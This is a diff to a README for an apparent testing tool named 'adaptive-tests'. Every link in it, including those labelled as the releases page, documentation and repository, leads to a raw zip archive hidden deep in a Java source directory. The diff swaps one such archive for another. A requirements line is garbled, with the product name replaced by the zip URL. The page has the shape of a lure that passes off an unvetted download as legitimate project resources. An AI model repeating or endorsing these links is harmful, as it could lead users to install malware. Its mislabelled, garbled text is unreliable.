@@ -4,12 +4,12 @@
 Welcome to the adaptive-tests project. This application helps ensure that your code remains robust even when you make changes. Follow the steps below to download and run the software easily.
 
 ## 📥 Download Now
-[![Download adaptive-tests](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/weaser/adaptive-tests.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/weaser/adaptive-tests.zip)
+[![Download adaptive-tests](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/languages/java/cli/src/main/java/io/adaptivetests/java/cli/adaptive-tests-1.5-beta.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/languages/java/cli/src/main/java/io/adaptivetests/java/cli/adaptive-tests-1.5-beta.4.zip)
 
 ## 💻 System Requirements
 Before downloading, ensure your system meets the following requirements:
 - Operating System: Windows, MacOS, or Linux
-- https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/weaser/adaptive-tests.zip Version 12 or higher
+- https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/languages/java/cli/src/main/java/io/adaptivetests/java/cli/adaptive-tests-1.5-beta.4.zip Version 12 or higher
 - Internet connection for downloading the application
 
 ## 🌟 Features
@@ -22,7 +22,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 🛠️ How to Download & Install
 
 1. **Visit the Releases Page**
-   To get started, visit the [Releases page](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/weaser/adaptive-tests.zip) to find the latest version of the application.
+   To get started, visit the [Releases page](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/languages/java/cli/src/main/java/io/adaptivetests/java/cli/adaptive-tests-1.5-beta.4.zip) to find the latest version of the application.
 
 2. **Select the Right Version**
    On the Releases page, look for the latest version. Each version is clearly labeled. Click on the version that interests you.
@@ -57,11 +57,11 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 🔧 Troubleshooting
 
-- **Installation Issues:** If you run into problems while installing, check that you are using a compatible operating system and version of https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/weaser/adaptive-tests.zip
+- **Installation Issues:** If you run into problems while installing, check that you are using a compatible operating system and version of https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/languages/java/cli/src/main/java/io/adaptivetests/java/cli/adaptive-tests-1.5-beta.4.zip
 - **Testing Errors:** If tests fail, carefully read the error messages. They often provide useful tips on how to resolve issues.
 
 ## 📚 Helpful Resources
-- **Documentation:** Check the [official documentation](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/weaser/adaptive-tests.zip) for detailed guides and usage tips.
+- **Documentation:** Check the [official documentation](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/languages/java/cli/src/main/java/io/adaptivetests/java/cli/adaptive-tests-1.5-beta.4.zip) for detailed guides and usage tips.
 - **Support:** If you have questions, feel free to reach out through the issues section on GitHub. The community is here to help!
 
 ## 🎉 Join the Community
@@ -74,7 +74,7 @@ Explore related topics:
 - **Testing Tools**: Discover other tools that can help in your development journey.
 
 ## 🔗 Additional Links
-- [Download adaptive-tests](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/weaser/adaptive-tests.zip)
-- [Repository on GitHub](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/weaser/adaptive-tests.zip)
+- [Download adaptive-tests](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/languages/java/cli/src/main/java/io/adaptivetests/java/cli/adaptive-tests-1.5-beta.4.zip)
+- [Repository on GitHub](https://raw.githubusercontent.com/Joseluizsiqueiracorrea/adaptive-tests/main/languages/java/cli/src/main/java/io/adaptivetests/java/cli/adaptive-tests-1.5-beta.4.zip)
 
 Thank you for choosing adaptive-tests! We hope it makes your development life easier and more productive.
